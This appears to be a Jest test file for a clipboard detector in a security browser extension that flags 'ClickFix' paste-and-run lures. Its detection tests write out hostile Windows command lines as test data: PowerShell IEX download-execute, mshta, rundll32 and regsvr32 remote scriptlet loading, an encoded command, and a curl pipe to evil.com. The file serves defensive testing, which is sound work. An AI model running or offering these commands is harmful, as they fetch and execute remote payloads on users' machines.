import { describe, test, expect } from '@jest/globals';
import { analyzeClipboard } from '../../../../../src/background/modules/clickfix/detector.js';

describe('ClickFix Detector', () => {
  describe('analyzeClipboard - valid inputs', () => {
    test('detects PowerShell download-execute payload (high confidence)', () => {
      const payload = 'powershell -w hidden -nop -c "IEX ((New-Object Net.WebClient).DownloadString(\'https://cdn-verification-check.test/update.ps1\'))"';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator).not.toBeNull();
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('high');
      expect(result.indicator.label).toContain('PowerShell');
      expect(result.snippet).toBeTruthy();
      expect(result.detectedAt).toBeGreaterThan(0);
    });

    test('detects mshta remote payload (high confidence)', () => {
      const payload = 'mshta https://verify-human-check.test/payload.hta';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('high');
      expect(result.indicator.label).toContain('mshta');
    });

    test('detects rundll32 JavaScript payload (high confidence)', () => {
      const payload = 'rundll32 javascript:"\\.\\..\\mshtml,RunHTMLApplication";document.write();GetObject("script:https://verify-human-check.test/a.sct")';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('high');
      expect(result.indicator.label).toContain('rundll32');
    });

    test('detects rundll32 UNC path payload (high confidence)', () => {
      const payload = 'rundll32 \\\\verify-human-check.test@ssl\\6f832e21-4e80-484f-9119-aef9fc6c5b28\\google.ct,#1 wpTi52N1';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('high');
    });

    test('detects regsvr32 scriptlet payload (high confidence)', () => {
      const payload = 'regsvr32 /s /u /i:https://verify-human-check.test/file.sct scrobj.dll';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('high');
      expect(result.indicator.label).toContain('regsvr32');
    });

    test('detects cmd /c execution (medium confidence)', () => {
      const payload = 'cmd /c start "" powershell -nop -w hidden -c "echo test-run"';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('medium');
      expect(result.indicator.label).toContain('cmd');
    });

    test('detects base64-encoded command (high confidence)', () => {
      const payload = 'powershell -enc JgAoACcgZnJvbSBgYXNkZngpIGZyb20gYXNkZngpJyBmcm9tIGFzcw==';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('obfuscation');
      expect(result.indicator.confidence).toBe('high');
      expect(result.indicator.label).toContain('encoded');
    });

    test('detects curl pipe-to-execute payload (high confidence)', () => {
      const payload = 'curl https://evil.com/script.sh | powershell';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('high');
    });

    test('detects Start-Process remote launch (high confidence)', () => {
      const payload = 'Start-Process -FilePath "https://example.com/payload.exe"';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.category).toBe('execution');
      expect(result.indicator.confidence).toBe('high');
    });
  });

  describe('analyzeClipboard - benign inputs', () => {
    test('allows benign meeting notes', () => {
      const payload = 'Meeting notes: bring laptop and charger at 09:30.';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
      expect(result.snippet).toBeNull();
      expect(result.detectedAt).toBeGreaterThan(0);
    });

    test('allows benign code comments', () => {
      const payload = '// TODO: implement the update function';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
    });

    test('allows benign URLs', () => {
      const payload = 'https://github.com/lawndoc/Threat Sense';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
    });

    test('allows benign file paths', () => {
      const payload = 'C:\\Users\\Documents\\projects\\threat-sense\\src';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
    });
  });

  describe('analyzeClipboard - edge cases', () => {
    test('handles null input gracefully', () => {
      const result = analyzeClipboard(null);

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
      expect(result.snippet).toBeNull();
    });

    test('handles undefined input gracefully', () => {
      const result = analyzeClipboard(undefined);

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
    });

    test('handles empty string gracefully', () => {
      const result = analyzeClipboard('');

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
    });

    test('handles non-string input gracefully', () => {
      const result = analyzeClipboard(12345);

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
    });

    test('truncates long snippets', () => {
      const longPayload = 'powershell -w hidden -nop -c "IEX ((New-Object Net.WebClient).DownloadString(\'https://test.com/x.ps1\'))' + 'A'.repeat(100) + '"';
      const result = analyzeClipboard(longPayload);

      expect(result.status).toBe('detected');
      expect(result.snippet.length).toBeLessThanOrEqual(123); // 120 + ellipsis char
      expect(result.snippet).toContain('…');
    });

    test('normalizes multiline payloads in snippet', () => {
      const payload = 'powershell\n-w hidden\n-nop\n-c "IEX ((New-Object Net.WebClient).DownloadString(\'https://test.com/x.ps1\'))"';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.snippet).not.toContain('\n');
      expect(result.snippet).not.toContain('\r');
      expect(result.snippet).not.toContain('\t');
    });

    test('is case-insensitive for PowerShell detection', () => {
      const payload = 'POWERSHELL -W HIDDEN -NOP -C "IEX ((New-Object Net.WebClient).DownloadString(\'url\'))"';
      const result = analyzeClipboard(payload);

      expect(result.status).toBe('detected');
      expect(result.indicator.label).toContain('PowerShell');
    });
  });

  describe('analyzeClipboard - result structure', () => {
    test('detected result has correct structure', () => {
      const payload = 'powershell -w hidden -nop -c "IEX"';
      const result = analyzeClipboard(payload);

      expect(result).toHaveProperty('status');
      expect(result).toHaveProperty('indicator');
      expect(result).toHaveProperty('snippet');
      expect(result).toHaveProperty('detectedAt');

      expect(result.indicator).toHaveProperty('label');
      expect(result.indicator).toHaveProperty('category');
      expect(result.indicator).toHaveProperty('confidence');
    });

    test('not-detected result has correct structure', () => {
      const payload = 'benign text';
      const result = analyzeClipboard(payload);

      expect(result).toHaveProperty('status');
      expect(result).toHaveProperty('indicator');
      expect(result).toHaveProperty('snippet');
      expect(result).toHaveProperty('detectedAt');

      expect(result.status).toBe('not-detected');
      expect(result.indicator).toBeNull();
      expect(result.snippet).toBeNull();
    });

    test('timestamp is always present', () => {
      const beforeTime = Date.now();
      const result = analyzeClipboard('powershell -w hidden -nop -c "IEX"');
      const afterTime = Date.now();

      expect(result.detectedAt).toBeGreaterThanOrEqual(beforeTime);
      expect(result.detectedAt).toBeLessThanOrEqual(afterTime);
    });
  });
});